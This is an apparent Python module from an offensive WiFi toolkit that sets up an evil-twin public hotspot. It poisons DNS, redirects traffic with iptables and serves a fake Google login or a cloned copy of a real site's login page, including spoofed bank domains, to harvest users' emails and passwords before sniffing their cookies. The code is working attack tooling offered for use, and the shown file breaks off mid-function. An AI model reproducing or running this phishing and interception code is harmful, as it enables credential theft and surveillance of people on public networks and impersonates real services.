"""
core/captive_portal.py
======================
Módulo de Captive Portal (Evil Twin Público)
-------------------------------------------
Simula una red WiFi pública de tipo "FreeMallWiFi" que al conectarse
muestra una página de login (estilo Google o plantilla personalizada
clonada de una URL real) para capturar credenciales del usuario.

Tras el login, la víctima recibe internet real via NAT (eth0 u otra
interfaz de salida). Simultáneamente se activa el sniffer de tráfico
HTTP para capturar cookies y credenciales en claro mientras navegan.

Stack técnico:
  - hostapd    → AP abierto (sin contraseña) con el SSID elegido
  - dnsmasq    → DHCP + DNS poisoning (responde GATEWAY_IP a todo)
                 DHCP option 114 anuncia la URL del portal (iOS 14+)
                 local-ttl=0 evita que el OS cachee la detección
  - iptables   → DNAT TCP/80+443 al portal hasta el primer login;
                 luego NAT hacia out_interface para dar internet real.
                 DNS fix: DNAT UDP/TCP 53 de IPs autenticadas → 8.8.8.8
                 (sin esto dnsmasq sigue respondiendo 10.0.0.1 a todo
                 y el móvil "tiene internet" pero no resuelve nada)
  - Flask      → sirve la página de phishing, rutas OS-probe que
                 devuelven 302 para forzar el popup en iOS/Android/Win,
                 y recoge credenciales
  - WireTrapSniffer → captura HTTP/cookies/DNS del tráfico post-login

Requisitos en Kali:
  sudo apt install hostapd dnsmasq python3-flask python3-scapy monolith
  pip install requests beautifulsoup4
  (la interfaz debe estar en modo managed, NO en monitor)
"""

import subprocess
import threading
import os
import sys
import time
import json
import base64
import mimetypes
from datetime import datetime
from urllib.parse import urljoin, urlparse

WIRETRAP_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, WIRETRAP_DIR)

# ── Configuración de red del portal ─────────────────────────────

GATEWAY_IP   = "10.0.0.1"
DHCP_START   = "10.0.0.10"
DHCP_END     = "10.0.0.100"
SUBNET_MASK  = "255.255.255.0"
FLASK_PORT   = 80
UPSTREAM_DNS = "8.8.8.8"   # DNS real para víctimas autenticadas


# ── Plantilla HTML: estilo Google ───────────────────────────────

_PORTAL_HTML_GOOGLE = """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Conectarse a la Red – Iniciar sesión con Google</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Segoe UI', Arial, sans-serif;
    background: #f2f2f2;
    display: flex; align-items: center; justify-content: center;
    min-height: 100vh;
  }
  .card {
    background: white; border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,.15);
    width: 360px; padding: 40px 36px 36px; text-align: center;
  }
  .google-logo { font-size: 28px; color: #5f6368; font-weight: 300;
    letter-spacing:-1px; margin-bottom: 28px; }
  .google-logo span.G  { color:#4285F4; }
  .google-logo span.o1 { color:#EA4335; }
  .google-logo span.o2 { color:#FBBC05; }
  .google-logo span.g  { color:#34A853; }
  .google-logo span.l  { color:#4285F4; }
  .google-logo span.e  { color:#EA4335; }
  h2 { font-size: 24px; color: #202124; font-weight: 400; margin-bottom: 8px; }
  p.sub { color: #5f6368; font-size: 14px; margin-bottom: 28px; }
  input[type=email], input[type=password] {
    width: 100%; border: 1px solid #dadce0; border-radius: 4px;
    padding: 13px 14px; font-size: 15px; outline: none;
    margin-bottom: 16px; color: #202124;
  }
  input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,.2); }
  .links { text-align: left; margin-bottom: 24px; }
  .links a { color: #1a73e8; font-size: 13px; text-decoration: none; }
  .btn-next {
    background: #1a73e8; color: white; border: none; border-radius: 4px;
    padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; float: right;
  }
  .btn-next:hover { background: #1765c7; }
  .btn-row { display: flex; justify-content: space-between; align-items: center; }
  .create-link a { color: #1a73e8; font-size: 13px; text-decoration: none; font-weight: 500; }
  .footer { margin-top: 30px; font-size: 11px; color: #5f6368; }
  .info-bar {
    background: #fff3cd; border: 1px solid #ffc107; border-radius: 4px;
    padding: 8px 12px; font-size: 12px; color: #856404; margin-bottom: 20px; text-align: left;
  }
</style>
</head>
<body>
<div class="card">
  <div class="google-logo">
    <span class="G">G</span><span class="o1">o</span><span class="o2">o</span><span class="g">g</span><span class="l">l</span><span class="e">e</span>
  </div>
  <h2>Iniciar sesión</h2>
  <p class="sub">para continuar en la red WiFi</p>
  <div class="info-bar">
    Conexión gratuita a la red WiFi pública.
    Se requiere autenticación para acceder a Internet.
  </div>
  <form method="POST" action="/login">
    <input name="email" type="email" placeholder="Correo electrónico o teléfono" required autofocus>
    <div class="links"><a href="#">¿Olvidaste tu correo?</a></div>
    <input name="password" type="password" placeholder="Contraseña" required>
    <div class="links"><a href="#">¿Olvidaste tu contraseña?</a></div>
    <div class="btn-row">
      <div class="create-link"><a href="#">Crear cuenta</a></div>
      <button class="btn-next" type="submit">Siguiente</button>
    </div>
  </form>
  <div class="footer">Español (España) • Ayuda • Privacidad • Términos</div>
</div>
</body>
</html>
"""

_PORTAL_HTML_SUCCESS = """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="2;url=https://www.google.com">
<title>Conectado</title>
<style>
  body { font-family:Arial,sans-serif; background:#f2f2f2;
         display:flex; align-items:center; justify-content:center; height:100vh; }
  .box { background:white; border-radius:8px; padding:40px; text-align:center;
         box-shadow:0 2px 10px rgba(0,0,0,.1); }
  h2 { color:#34A853; font-size:22px; margin-bottom:10px; }
  p  { color:#5f6368; font-size:14px; }
</style>
</head>
<body>
<div class="box">
  <h2>Conectado!</h2>
  <p>Ahora tienes acceso a Internet.</p>
  <p>Redirigiendo a Google...</p>
</div>
</body>
</html>
"""


# ── Clonador de páginas de login ─────────────────────────────────

def _patch_form(html_text, _log):
    """
    Paso 1 (pre-monolith): adapta el formulario de login en el DOM de chromium.
    NO elimina scripts ni <base> para que monolith pueda resolver recursos CSS/fuentes.
    Devuelve (html_adaptado, form_encontrado).
    """
    try:
        from bs4 import BeautifulSoup
    except ImportError:
        return html_text, False

    soup = BeautifulSoup(html_text, "html.parser")

    target_form = next(
        (f for f in soup.find_all("form") if f.find("input", {"type": "password"})),
        None
    )
    if target_form:
        target_form["method"] = "POST"
        target_form["action"] = "/login"
        email_input = (
            target_form.find("input", {"type": "email"}) or
            target_form.find("input", {"type": "text"}) or
            target_form.find("input", {"type": "tel"})
        )
        if email_input:
            email_input["name"] = "email"
        pwd = target_form.find("input", {"type": "password"})
        if pwd:
            pwd["name"] = "password"
        _log("[+] Formulario adaptado → POST /login")
        return str(soup), True
    else:
        return html_text, False


def _adapt_form(html_text, _log):
    """
    Paso 2 (post-monolith o fallback): limpia scripts externos/<base> e inyecta
    overlay si no hay form adaptado. Si _patch_form ya adaptó el form (action=/login),
    lo detecta y no sobreescribe ni inyecta overlay.
    """
    try:
        from bs4 import BeautifulSoup
    except ImportError:
        return html_text

    soup = BeautifulSoup(html_text, "html.parser")

    # Comprobar si el form ya fue adaptado por _patch_form (action="/login")
    already_adapted = any(
        f.get("action") in ("/login", "/login/") 
        for f in soup.find_all("form")
    )

    if already_adapted:
        # Form ya adaptado correctamente — solo limpiar
        pass
    else:
        # Buscar form con password y adaptarlo
        target_form = next(
            (f for f in soup.find_all("form") if f.find("input", {"type": "password"})),
            None
        )
        if target_form:
            target_form["method"] = "POST"
            target_form["action"] = "/login"
            email_input = (
                target_form.find("input", {"type": "email"}) or
                target_form.find("input", {"type": "text"}) or
                target_form.find("input", {"type": "tel"})
            )
            if email_input:
                email_input["name"] = "email"
            pwd = target_form.find("input", {"type": "password"})
            if pwd:
                pwd["name"] = "password"
            _log("[+] Formulario adaptado → POST /login")
        else:
            _log("[!] Sin form con password: inyectando overlay")
            overlay = (
                '<div id="wt-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;'
                'background:rgba(0,0,0,0.72);z-index:99999;display:flex;align-items:center;'
                'justify-content:center;font-family:sans-serif;">'
                '<div style="background:#fff;border-radius:10px;padding:40px 36px;width:340px;'
                'text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.4);">'
                '<h2 style="margin:0 0 6px;font-size:22px;color:#202124;font-weight:500;">'
                'Inicia sesion para continuar</h2>'
                '<p style="margin:0 0 24px;font-size:13px;color:#5f6368;">'
                'Necesitas identificarte para acceder a internet</p>'
                '<form method="POST" action="/login">'
                '<input name="email" type="email" placeholder="Correo electronico" required '
                'style="display:block;width:100%;padding:11px 12px;margin-bottom:12px;'
                'border:1px solid #dadce0;border-radius:4px;font-size:14px;box-sizing:border-box">'
                '<input name="password" type="password" placeholder="Contrasena" required '
                'style="display:block;width:100%;padding:11px 12px;margin-bottom:20px;'
                'border:1px solid #dadce0;border-radius:4px;font-size:14px;box-sizing:border-box">'
                '<button type="submit" '
                'style="width:100%;background:#1a73e8;color:#fff;border:none;border-radius:4px;'
                'padding:11px;font-size:15px;font-weight:500;cursor:pointer;">'
                'Acceder</button>'
                '</form>'
                '</div>'
                '</div>'
            )
            body = soup.find("body")
            if body:
                body.insert(0, BeautifulSoup(overlay, "html.parser"))

    for tag in soup.find_all("script", src=True):
        tag.decompose()
    for tag in soup.find_all("base"):
        tag.decompose()

    _log("[+] Clonacion completada")
    return str(soup)


def clone_login_page(url, log_fn=None):
    """
    Descarga la página de login indicada por 'url' y devuelve un HTML
    autocontenido con todos los recursos (CSS, imágenes, fuentes) incrustados
    como data-URI en base64.

    Estrategia (en orden de preferencia):
      1. chromium --dump-dom | monolith
         monolith inlina TODO: CSS, fuentes (@font-face), imágenes como data-URI.
         Resuelve el problema de fuentes incorrectas y CSS bloqueados (403).
         Instalacion: sudo apt install monolith
      2. Fallback: chromium --dump-dom + inlining manual con requests
         Funciona para sitios que no bloquean recursos.
      3. Fallback final: requests directo (sin JS rendering)

    Args:
        url:    URL de la página de login real
        log_fn: función opcional para mensajes de progreso
    Returns:
        str con HTML autocontenido, o "" si falla
    """
    def _log(msg):
        if log_fn:
            log_fn(msg)

    try:
        import requests
        from bs4 import BeautifulSoup
    except ImportError:
        _log("[!] pip3 install requests beautifulsoup4 --break-system-packages")
        return ""

    import re
    import shutil
    import subprocess
    from urllib.parse import urljoin, urlparse

    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    HEADERS = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "es-ES,es;q=0.9,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }

    chromium_bin = (shutil.which("chromium") or
                    shutil.which("chromium-browser") or
                    shutil.which("google-chrome") or
                    shutil.which("google-chrome-stable"))
    monolith_bin = shutil.which("monolith")

    _log("[*] Iniciando clonacion de: " + url)

    # ── 1. Pipeline optimo: chromium --dump-dom | monolith ──────────────────────
    # monolith descarga y embebe TODOS los recursos (CSS, fuentes, imagenes)
    # como data-URI base64. Produce HTML 100% autocontenido visualmente identico.
    if chromium_bin and monolith_bin:
        _log("[*] Usando pipeline: chromium --dump-dom | monolith")
        try:
            dump_result = subprocess.run(
                [
                    chromium_bin,
                    "--headless=new",
                    "--no-sandbox",
                    "--disable-setuid-sandbox",
                    "--disable-gpu",
                    "--disable-dev-shm-usage",
                    "--disable-blink-features=AutomationControlled",
                    "--user-agent=" + HEADERS["User-Agent"],
                    "--timeout=20000",
                    "--dump-dom",
                    url,
                ],
                capture_output=True,
                text=True,
                timeout=35,
            )

            if dump_result.returncode == 0 and len(dump_result.stdout) > 500:
                _log("[*] Chromium dump-dom OK (" + str(len(dump_result.stdout)) + " bytes)")

                # Estrategia: monolith procesa el HTML original para incrustar
                # CSS/fuentes como data-URI. Pero monolith destruye <form>/<input>
                # al re-serializar el DOM. Solución: extraemos los <style> y <link>
                # incrustados que genera monolith y los inyectamos en el HTML
                # original (que sí conserva el form intacto).
                mono_result = subprocess.run(
                    [
                        monolith_bin,
                        "-",
                        "-I",
                        "-b", url,
                        "--insecure",
                    ],
                    input=dump_result.stdout,
                    capture_output=True,
                    text=True,
                    timeout=120,
                )

                if mono_result.returncode == 0 and len(mono_result.stdout) > 1000:
                    _log("[+] monolith OK (" + str(len(mono_result.stdout)) + " bytes) — extrayendo CSS embebido")

                    # Extraer estilos incrustados de monolith (data-URI base64)
                    try:
                        from bs4 import BeautifulSoup as BS
                        soup_mono = BS(mono_result.stdout, "html.parser")
                        # Recoger todos los <style> con data-URI (fuentes/CSS embebidos)
                        embedded_styles = []
                        for tag in soup_mono.find_all("style"):
                            if tag.string and ("data:" in tag.string or len(tag.string) > 500):
                                embedded_styles.append(str(tag))
                        # Recoger <link rel=stylesheet> con data-URI href
                        for tag in soup_mono.find_all("link", rel=lambda r: r and "stylesheet" in r):
                            href = tag.get("href", "")
                            if href.startswith("data:"):
                                embedded_styles.append(str(tag))

                        # Inyectar estilos embebidos en el HTML original (con form)
                        soup_orig = BS(dump_result.stdout, "html.parser")
                        head = soup_orig.find("head")
                        if head and embedded_styles:
                            injection = BS("".join(embedded_styles), "html.parser")
                            head.append(injection)
                            _log("[+] " + str(len(embedded_styles)) + " bloques CSS/fuentes inyectados en HTML original")
                        
                        combined_html = str(soup_orig)
                    except Exception as e:
                        _log("[!] Error extrayendo CSS de monolith: " + str(e))
                        combined_html = dump_result.stdout

                    return _adapt_form(combined_html, _log)
                else:
                    stderr_preview = mono_result.stderr[:200] if mono_result.stderr else "sin output"
                    _log("[!] monolith fallo (rc=" + str(mono_result.returncode) + "): " + stderr_preview)
            else:
                _log("[!] Chromium devolvio poco contenido (" + str(len(dump_result.stdout)) + " bytes)")
        except subprocess.TimeoutExpired:
            _log("[!] Pipeline chromium|monolith tardó demasiado, usando fallback")
        except Exception as e:
            _log("[!] Pipeline chromium|monolith error: " + str(e))

    elif not monolith_bin:
        _log("[!] monolith no encontrado — instala: sudo apt install monolith")
        _log("[!] Usando fallback manual (fuentes externas pueden no cargarse)")

    # ── 2. Fallback: chromium --dump-dom + inlining manual ──────────────────────
    html_text = ""
    final_url  = url

    if chromium_bin:
        _log("[*] Usando " + chromium_bin + " --headless --dump-dom")
        try:
            result = subprocess.run(
                [
                    chromium_bin,
                    "--headless=new",
                    "--no-sandbox",
                    "--disable-setuid-sandbox",
                    "--disable-gpu",
                    "--disable-dev-shm-usage",
                    "--disable-blink-features=AutomationControlled",
                    "--user-agent=" + HEADERS["User-Agent"],
                    "--timeout=20000",
                    "--dump-dom",
                    url,
                ],
                capture_output=True,
                text=True,
                timeout=30,
            )
            if result.returncode == 0 and len(result.stdout) > 500:
                html_text = result.stdout
                final_url = url
                _log("[*] Chromium dump-dom OK (" + str(len(html_text)) + " bytes)")
            else:
                _log("[!] Chromium devolvio poco contenido, usando requests")
        except subprocess.TimeoutExpired:
            _log("[!] Chromium tardó demasiado, usando requests")
        except Exception as e:
            _log("[!] Chromium fallo: " + str(e))

    # ── 3. Fallback final: requests con cookies de sesion ───────────────────────
    if not html_text or len(html_text) < 500:
        _log("[*] Descargando con requests: " + url)
        try:
            sess = requests.Session()
            sess.headers.update(HEADERS)
            sess.verify = False
            parsed = urlparse(url)
            home = parsed.scheme + "://" + parsed.netloc + "/"
            try:
                sess.get(home, timeout=10, allow_redirects=True)
            except Exception:
                pass
            resp = sess.get(url, timeout=20, allow_redirects=True)
            resp.raise_for_status()
            final_url = resp.url
            html_text = resp.content.decode(resp.encoding or "utf-8", errors="replace")
            _log("[*] requests OK (" + str(len(html_text)) + " bytes). URL final: " + final_url)
        except Exception as e:
            _log("[!] requests fallo: " + str(e))
            return ""

    soup = BeautifulSoup(html_text, "html.parser")

    res_sess = requests.Session()
    res_sess.headers.update(HEADERS)
    res_sess.verify = False

    def to_data_uri(href, base):
        abs_url = urljoin(base, href)
        if urlparse(abs_url).scheme not in ("http", "https"):
            return None
        try:
            r = res_sess.get(abs_url, timeout=10, allow_redirects=True)
            if r.status_code != 200:
                return None
            ct = r.headers.get("Content-Type", "").split(";")[0].strip()
            if not ct:
                ext = os.path.splitext(urlparse(abs_url).path)[1].lower()
                ct = mimetypes.types_map.get(ext, "application/octet-stream")
            return "data:" + ct + ";base64," + base64.b64encode(r.content).decode()
        except Exception:
            return None

    def inline_css_urls(css_text, base):
        def _repl(m):
            raw = m.group(1).strip(" '\"")
            if raw.startswith("data:"):
                return m.group(0)
            d = to_data_uri(raw, base)
            return "url(" + d + ")" if d else m.group(0)
        return re.sub(r"url\(([^)]+)\)", _repl, css_text)

    for tag in soup.find_all("link", rel=lambda v: v and "stylesheet" in v):
        href = tag.get("href", "")
        if not href or href.startswith("data:"):
            continue
        _log("  [css] " + href[:80])
        abs_url = urljoin(final_url, href)
        try:
            r = res_sess.get(abs_url, timeout=10)
            if r.status_code == 200:
                css = inline_css_urls(r.text, abs_url)
                style = soup.new_tag("style")
                style.string = css
                tag.replace_with(style)
            else:
                _log("  [!] CSS " + str(r.status_code) + ": " + href[:60])
                tag.decompose()
        except Exception as e:
            _log("  [!] CSS error: " + str(e))
            tag.decompose()

    for tag in soup.find_all("img"):
        src = tag.get("src", "")
        if src and not src.startswith("data:"):
            d = to_data_uri(src, final_url)
            if d:
                tag["src"] = d

    for tag in soup.find_all("style"):
        if tag.string:
            tag.string = inline_css_urls(tag.string, final_url)
    for tag in soup.find_all(style=True):
        tag["style"] = inline_css_urls(tag["style"], final_url)

    return _adapt_form(str(soup), _log)


def _build_flask_app(gateway_ip, template_type, creds_log,
                     custom_html=None,
                     on_credential=None, on_client_login=None,
                     dns_spoof_domains=None):
    """
    Construye la app Flask del portal.

    template_type:     "google" | "custom"
    custom_html:       HTML clonado (solo cuando template_type == "custom")
    dns_spoof_domains: lista de dicts [{"domain": "bbva.com", "clone_url": "...", "html": "..."}]
                       Si entry["html"] está relleno, Flask sirve esa copia cuando el Host
                       del request coincide con ese dominio.

    Incluye rutas de detección para cada SO:
      - iOS/macOS: /hotspot-detect.html, /library/test/success.html
      - Android:   /generate_204, /gen_204, /connectivitycheck
      - Windows:   /connecttest.txt, /ncsi.txt
      - Firefox:   /canonical.html
    """
    try:
        from flask import Flask, request, make_response, redirect
    except ImportError:
        return None

    app = Flask(__name__)
    app.secret_key = os.urandom(16)

    if template_type == "custom" and custom_html:
        portal_html = custom_html
    else:
        portal_html = _PORTAL_HTML_GOOGLE

    portal_url = "http://" + gateway_ip + "/"

    # Mapa dominio → HTML clonado para DNS Spoofing
    # {"bbva.com": "<html>...", "santander.com": "<html>..."}
    _spoof_html_map = {}
    if dns_spoof_domains:
        for entry in dns_spoof_domains:
            if not isinstance(entry, dict):
                continue
            d = entry.get("domain", "").strip().lower()
            h = entry.get("html", "")
            if d and h:
                _spoof_html_map[d] = h

    def _get_spoof_html_for_request():
        """
        Devuelve el HTML clonado si el Host header coincide con algún dominio
        del mapa de spoofing. Devuelve None si no hay coincidencia.
        """
        if not _spoof_html_map:
            return None
        host = request.headers.get("Host", "").lower().split(":")[0]  # quitar puerto
        # Coincidencia exacta
        if host in _spoof_html_map:
            return _spoof_html_map[host]
        # Coincidencia sin "www."
        host_no_www = host[4:] if host.startswith("www.") else host
        if host_no_www in _spoof_html_map:
            return _spoof_html_map[host_no_www]
        # El dominio guardado puede tener www. y el request no
        if "www." + host in _spoof_html_map:
            return _spoof_html_map["www." + host]
        return None

    @app.route("/hotspot-detect.html")
    @app.route("/library/test/success.html")
    @app.route("/hotspot-detect")
    def apple_probe():
        return redirect(portal_url, 302)

    @app.route("/generate_204")
    @app.route("/gen_204")
    @app.route("/generate204")
    @app.route("/connectivitycheck")
    @app.route("/connectivitycheck.html")
    def android_probe():
        return redirect(portal_url, 302)

    @app.route("/connecttest.txt")
    @app.route("/ncsi.txt")
    def windows_probe():
        return redirect(portal_url, 302)

    @app.route("/canonical.html")
    def firefox_probe():
        return redirect(portal_url, 302)

    @app.route("/login", methods=["POST"])
    def login():
        email    = request.form.get("email", "").strip()
        password = request.form.get("password", "").strip()
        ip       = request.remote_addr
        ts       = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        # Incluir el dominio spoofado si aplica (para saber de qué web vinieron las creds)
        host     = request.headers.get("Host", "").lower().split(":")[0]
        entry    = {"timestamp": ts, "ip": ip, "email": email, "password": password, "host": host}
        creds_log.append(entry)
        if on_credential:
            on_credential(entry)
        if on_client_login:
            on_client_login(ip)
        return make_response(_PORTAL_HTML_SUCCESS, 200)

    @app.route("/favicon.ico")
    def favicon():
        return "", 204

    @app.route("/", defaults={"path": ""})
    @app.route("/<path:path>")
    def catch_all(path):
        # Si el Host coincide con un dominio spoofado y tenemos su clon → servirlo
        spoof_html = _get_spoof_html_for_request()
        if spoof_html:
            return make_response(spoof_html, 200)
        # Si no → portal cautivo normal
        return make_response(portal_html, 200)

    return app


# ── Clase principal ──────────────────────────────────────────────

class CaptivePortal:
    """
    Levanta un AP abierto + DHCP + DNS poisoning + portal de phishing.
    """

    def __init__(self, interface):
        self.interface     = interface
        self.out_interface = "eth0"
        self.running       = False

        self.ssid          = "FreeWiFi"
        self.channel       = 6
        self.template_type = "google"
        self.custom_html   = ""

        self.captured_creds  = []
        self._logged_in_ips  = set()

        # DNS Spoofing por dominio específico
        # Lista de dicts: [{"domain": "bbva.com", "clone_url": "https://bbva.com/login", "html": "..."}]
        # Si clone_url está vacío, redirige al captive portal normal.
        # Si html está relleno (clonado al arrancar), Flask sirve esa copia.
        self.dns_spoof_domains   = []
        self.dns_spoof_target_ip = GATEWAY_IP

        self._hostapd_conf = "/tmp/wt_cp_hostapd.conf"
        self._dnsmasq_conf = "/tmp/wt_cp_dnsmasq.conf"
        self._dnsmasq_pid  = "/tmp/wt_cp_dnsmasq.pid"

        self._hostapd_proc = None
        self._dnsmasq_proc = None
        self._flask_thread = None
        self._sniffer      = None

        self.on_started    = None
        self.on_stopped    = None
        self.on_error      = None
        self.on_credential = None
        self.on_sniff_data = None
        self.on_log        = None

    def _log(self, msg):
        if self.on_log:
            self.on_log(msg)

    def _err(self, msg):
        if self.on_error:
            self.on_error(msg)

    @staticmethod
    def _hw_mode(channel):
        return "a" if channel >= 36 else "g"

    def clone_template(self, url):
        """
        Clona la página de login en 'url' y la guarda en self.custom_html.
        Retorna True si tuvo éxito, False si falló.
        """
        self._log("[*] Iniciando clonacion de: " + url)
        html = clone_login_page(url, log_fn=self._log)
        if html:
            self.custom_html = html
            self.template_type = "custom"
            self._log("[+] Plantilla clonada OK (" + str(len(html)) + " bytes)")
            return True
        else:
            self._err("No se pudo clonar la plantilla.")
            return False

    def _write_hostapd_conf(self):
        hw = self._hw_mode(self.channel)
        conf = ("interface=" + self.interface + "\ndriver=nl80211\nssid=" + self.ssid + "\n"
                "hw_mode=" + hw + "\nchannel=" + str(self.channel) + "\nauth_algs=1\nwpa=0\n"
                "ignore_broadcast_ssid=0\nieee80211n=1\nwmm_enabled=1\n")
        open(self._hostapd_conf, "w").write(conf)
        self._log("hostapd.conf → " + self._hostapd_conf)

    def _write_dnsmasq_conf(self):
        if self.dns_spoof_domains:
            target = self.dns_spoof_target_ip or GATEWAY_IP
            conf = (
                "interface=" + self.interface + "\n"
                "bind-interfaces\n"
                "dhcp-range=" + DHCP_START + "," + DHCP_END + "," + SUBNET_MASK + ",5m\n"
                "dhcp-option=3," + GATEWAY_IP + "\n"
                "dhcp-option=6," + GATEWAY_IP + "\n"
                "dhcp-option=114,http://" + GATEWAY_IP + "/\n"
                "server=" + UPSTREAM_DNS + "\n"
                "local-ttl=0\n"
                "log-dhcp\n"
                "log-queries\n"
            )
            for entry in self.dns_spoof_domains:
                d = entry["domain"].strip().lower() if isinstance(entry, dict) else entry.strip().lower()
                if d:
                    conf += "address=/" + d + "/" + target + "\n"
            self._log("[DNS Spoof] " + str(len(self.dns_spoof_domains)) + " dominios → " + target)
        else:
            conf = (
                "interface=" + self.interface + "\n"
                "bind-interfaces\n"
                "dhcp-range=" + DHCP_START + "," + DHCP_END + "," + SUBNET_MASK + ",5m\n"
                "dhcp-option=3," + GATEWAY_IP + "\n"
                "dhcp-option=6," + GATEWAY_IP + "\n"
                "dhcp-option=114,http://" + GATEWAY_IP + "/\n"
                "address=/#/" + GATEWAY_IP + "\n"
                "local-ttl=0\n"
                "log-dhcp\n"
                "no-resolv\n"
            )
        open(self._dnsmasq_conf, "w").write(conf)
        self._log("dnsmasq.conf → " + self._dnsmasq_conf)

    def _configure_interface(self):
        subprocess.run(["nmcli", "dev", "set", self.interface, "managed", "no"],
                       capture_output=True)
        subprocess.run(["ip", "link", "set", self.interface, "up"], capture_output=True)
        subprocess.run(["ip", "addr", "flush", "dev", self.interface], capture_output=True)
        subprocess.run(["ip", "addr", "add", GATEWAY_IP + "/24", "dev", self.interface],
                       capture_output=True)
        self._log("Interfaz " + self.interface + " → " + GATEWAY_IP + "/24")

    def _setup_iptables_portal(self):
        iface = self.interface
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        subprocess.run(["iptables", "-F"], capture_output=True)
        subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)

        subprocess.run(["iptables", "-A", "INPUT", "-i", "lo", "-j", "ACCEPT"],
                       capture_output=True)
        subprocess.run(["iptables", "-A", "INPUT", "-i", iface,
                        "-p", "udp", "--dport", "53", "-j", "ACCEPT"], capture_output=True)
        subprocess.run(["iptables", "-A", "INPUT", "-i", iface,
                        "-p", "udp", "--dport", "67", "-j", "ACCEPT"], capture_output=True)
        subprocess.run(["iptables", "-A", "INPUT", "-i", iface,
                        "-p", "tcp", "--dport", "80", "-j", "ACCEPT"], capture_output=True)

        subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                        "-i", iface, "-p", "tcp", "--dport", "80",
                        "-j", "DNAT", "--to-destination=" + GATEWAY_IP + ":" + str(FLASK_PORT)],
                       capture_output=True)
        subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING",
                        "-i", iface, "-p", "tcp", "--dport", "443",
                        "-j", "DNAT", "--to-destination=" + GATEWAY_IP + ":" + str(FLASK_PORT)],
                       capture_output=True)

        subprocess.run(["iptables", "-A", "FORWARD",
                        "-m", "conntrack", "--ctstate", "ESTABLISHED,RELATED",
                        "-j", "ACCEPT"], capture_output=True)
        subprocess.run(["iptables", "-A", "FORWARD", "-i", iface, "-j", "DROP"],
                       capture_output=True)

        self._log("iptables: modo portal (sin internet)")

    def _grant_internet(self, client_ip):
        iface  = self.interface
        out_if = self.out_interface

        subprocess.run(["iptables", "-D", "FORWARD", "-i", iface, "-j", "DROP"],
                       capture_output=True)

        if self.dns_spoof_domains:
            # Modo DNS Spoofing: dnsmasq ya hace de proxy DNS real (server=UPSTREAM_DNS).
            # El cliente apunta a dnsmasq por DHCP, no necesitamos DNAT del port 53.
            for proto in ("udp", "tcp"):
                subprocess.run(["iptables", "-I", "FORWARD", "1",
                                "-i", iface, "-o", out_if,
                                "-p", proto, "--dport", "53", "-j", "ACCEPT"],
                               capture_output=True)
        else:
            # Modo portal puro: redirigir DNS del cliente al upstream post-login
            for proto in ("udp", "tcp"):
                subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
                                "-i", iface, "-s", client_ip,
                                "-p", proto, "--dport", "53",
                                "-j", "DNAT", "--to-destination=" + UPSTREAM_DNS + ":53"],
                               capture_output=True)

        for port in ("80", "443"):
            subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
                            "-i", iface, "-s", client_ip,
                            "-p", "tcp", "--dport", port, "-j", "RETURN"],
                           capture_output=True)

        subprocess.run(["iptables", "-I", "FORWARD", "1",
                        "-i", iface, "-s", client_ip,
                        "-o", out_if, "-j", "ACCEPT"],
                       capture_output=True)
        subprocess.run(["iptables", "-I", "FORWARD", "1",
                        "-i", out_if, "-d", client_ip,
                        "-o", iface, "-j", "ACCEPT"],
                       capture_output=True)

        subprocess.run(["iptables", "-A", "FORWARD", "-i", iface, "-j", "DROP"],
                       capture_output=True)
        subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING",
                        "-s", client_ip, "-o", out_if, "-j", "MASQUERADE"],
                       capture_output=True)

        for proto in ("udp", "tcp"):
            subprocess.run(["iptables", "-I", "FORWARD", "1",
                            "-i", iface, "-s", client_ip,
                            "-p", proto, "--dport", "53", "-j", "ACCEPT"],
                           capture_output=True)

        self._log("[+] Internet concedido a " + client_ip + " via " + out_if +
                  " (DNS → " + UPSTREAM_DNS + ")")

    def _clear_iptables(self):
        subprocess.run(["iptables", "-F"], capture_output=True)
        subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
        self._log("iptables limpiado")

    def _start_hostapd(self):
        try:
            self._hostapd_proc = subprocess.Popen(
                ["hostapd", self._hostapd_conf],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            time.sleep(2)
            if self._hostapd_proc.poll() is not None:
                out = self._hostapd_proc.stdout.read().decode(errors="ignore")
                self._err("hostapd terminó prematuramente:\n" + out)
                return False
            self._log("hostapd arrancado (PID " + str(self._hostapd_proc.pid) + ")")
            return True
        except FileNotFoundError:
            self._err("hostapd no encontrado: sudo apt install hostapd")
            return False
        except Exception as e:
            self._err("Error hostapd: " + str(e))
            return False

    def _start_dnsmasq(self):
        try:
            subprocess.run(["pkill", "-f", "wt_cp_dnsmasq"], capture_output=True)
            time.sleep(0.5)
            self._dnsmasq_proc = subprocess.Popen(
                ["dnsmasq", "-C", self._dnsmasq_conf, "--no-daemon",
                 "--pid-file=" + self._dnsmasq_pid],
